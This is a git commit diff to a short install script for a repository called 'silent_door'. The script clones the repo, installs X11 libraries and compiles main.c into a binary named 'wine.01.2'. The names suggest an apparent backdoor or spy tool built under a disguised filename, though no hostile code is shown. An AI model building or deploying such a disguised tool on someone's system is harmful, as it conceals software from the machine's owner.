b96dc936632ca97766e38ae10b25fbb3b0259f7c
mrx6SO <53888062+mrx6SO@users.noreply.github.com>
2019-08-25 23:54:24 -0300

    Update sdinstall.sh

--- install/sdinstall.sh
+++ install/sdinstall.sh
@@ -1,5 +1,5 @@
 git clone https://github.com/mrx6SO/silent_door
-cd silent_door 
+cd ~/silent_door 
 
 apt install libx11-dev && apt-get update && apt upgrade -y 
 cc main.c -o wine.01.2 -lm -w -lX11 
